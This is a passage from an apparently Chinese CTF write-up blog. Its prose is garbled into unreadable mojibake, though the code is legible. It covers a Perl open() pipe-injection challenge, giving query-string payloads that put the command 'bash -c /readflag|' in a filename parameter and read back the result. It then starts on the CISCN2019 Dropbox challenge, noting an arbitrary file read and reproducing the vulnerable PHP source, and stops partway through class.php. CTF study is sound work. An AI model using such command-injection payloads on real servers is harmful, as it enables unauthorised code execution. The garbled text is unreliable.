è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œæ‰§è¡Œçš„å‰ææ˜¯ å‰é¢å¿…é¡»è¦åˆ›å»ºä¸€ä¸ªå’Œè¿™ä¸ªå‘½ä»¤ä¸€æ ·çš„æ–‡ä»¶ã€‚ç„¶åå‘¢å°±æ˜¯å°†å‘½ä»¤æ‰§è¡Œçš„ç»“æœæ”¾åˆ°æˆ‘ä»¬ä¼ è¿›å»çš„æ–‡ä»¶é‡Œé¢ã€‚</p></blockquote><p>å…ˆçœ‹çœ‹æ ¹ç›®å½•ä¸‹æœ‰ä»€ä¹ˆ</p><pre class="line-numbers language-none"><code class="language-none">?url&#x3D;&#x2F;&amp;filename&#x3D;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>çœ‹åˆ°äº†readflagæ–‡ä»¶ï¼Œåº”è¯¥æ˜¯è¦åœ¨æ ¹ç›®å½•æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶æ‹¿åˆ°flagäº†</p><blockquote><p>ä¸»è¦çš„çŸ¥è¯†ç‚¹ï¼šperlå‡½æ•°çœ‹åˆ°è¦æ‰“å¼€çš„æ–‡ä»¶åä¸­å¦‚æœä»¥ç®¡é“ç¬¦ï¼ˆé”®ç›˜ä¸Šé‚£ä¸ªç«–æ |ï¼‰ç»“å°¾ï¼Œå°±ä¼šä¸­æ–­åŸæœ‰æ‰“å¼€æ–‡ä»¶æ“ä½œï¼Œå¹¶ä¸”æŠŠè¿™ä¸ªæ–‡ä»¶åå½“ä½œä¸€ä¸ªå‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶ä¸”å°†å‘½ä»¤çš„æ‰§è¡Œç»“æœä½œä¸ºè¿™ä¸ªæ–‡ä»¶çš„å†…å®¹å†™å…¥ã€‚è¿™ä¸ªå‘½ä»¤çš„æ‰§è¡Œæƒé™æ˜¯å½“å‰çš„ç™»å½•è€…ã€‚å¦‚æœä½ æ‰§è¡Œè¿™ä¸ªå‘½ä»¤ï¼Œä½ ä¼šçœ‹åˆ°perlç¨‹åºè¿è¡Œçš„ç»“æœã€‚</p></blockquote><p>çœ‹payload</p><pre class="line-numbers language-none"><code class="language-none">payload1:&#x2F;?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;bash -c &#x2F;readflag|è¿™ä¸€æ­¥æ˜¯å…ˆå°†bash -c &#x2F;readflag|å†™å…¥åä¸ºbash -c &#x2F;readflag|çš„æ–‡ä»¶é‡Œpayload2:&#x2F;?url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;aaaè¿™ä¸€æ­¥æ˜¯è¦æ‰§è¡Œä¸Šä¸€æ­¥ä¸­å†™å…¥çš„å‘½ä»¤å¹¶æŠŠç»“æœæ”¾å…¥aaaæ–‡ä»¶ä¸­payload3:&#x2F;sandbox&#x2F;230317844a87b41e353b096d0d6a5145&#x2F;aaa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox"></a>[CISCN2019 ååŒ—èµ›åŒº Day1 Web1]Dropbox</h2><p>æ³¨å†Œ-&gt;ç™»å½•-&gt;ä¸Šä¼ æ–‡ä»¶-&gt;å°è¯•ä¸‹è½½-&gt;å‘ç°ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ŒæŸ¥çœ‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php">//index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token function">Size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//download.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"class.php"</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">40</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Disposition: attachment; filename="</span> <span class="token operator">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File not exist"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>//class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dbaddr</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span><span class="token variable">$dbuser</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpass</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"dropbox"</span><span class="token punctuation">;</span><span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$dbaddr</span><span class="token punctuation">,</span> <span class="token variable">$dbuser</span><span class="token punctuation">,</span> <span class="token variable">$dbpass</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$db</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$count</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$count</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">add_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ss"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">user_exist</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$password</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"SiAchGHmFx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT `password` FROM `users` WHERE `username` = ?;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$expect</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$expect</span> <span class="token operator">===</span> <span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">db</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">FileList</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$results</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$funcs</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filenames</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">".."</span><span class="token punctuation">,</span> <span class="token variable">$filenames</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$filenames</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filenames</span> <span class="token keyword">as</span> <span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$file</span><span class="token operator">-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span> <span class="token operator">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__call</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span><span class="token punctuation">,</span> <span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//å°†ä¸€ä¸ªfuncæ”¾å…¥funcs</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//filesä¸ºä¸€ä¸ªæ•°ç»„ï¼Œå­˜æ”¾newå‡ºçš„å¯¹è±¡å¹¶è¿›è¡Œéå†</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span><span class="token punctuation">[</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$func</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token operator">-></span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//resultsæ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œ[æ–‡ä»¶å][æ–¹æ³•]=æ–¹æ³•æ‰§è¡Œç»“æœ</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;div id="container" class="container">&lt;div class="table-responsive">&lt;table id="table" class="table table-bordered table-hover sm-font">'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;thead>&lt;tr>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">funcs</span> <span class="token keyword">as</span> <span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;th scope="col" class="text-center">Opt&lt;/th>'</span><span class="token punctuation">;</span>        <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/thead>&lt;tbody>'</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">results</span> <span class="token keyword">as</span> <span class="token variable">$filename</span> <span class="token operator">=></span> <span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;tr>'</span><span class="token punctuation">;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token keyword">as</span> <span class="token variable">$func</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center">'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;td class="text-center" filename="'</span> <span class="token operator">.</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'">&lt;a href="#" class="download">ä¸‹è½½&lt;/a> / &lt;a href="#" class="delete">åˆ é™¤&lt;/a>&lt;/td>'</span><span class="token punctuation">;</span>            <span class="token variable">$table</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'&lt;/tr>'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token variable">$table</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' B'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' KB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' MB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' GB'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/=</span> <span class="token number">1024</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" 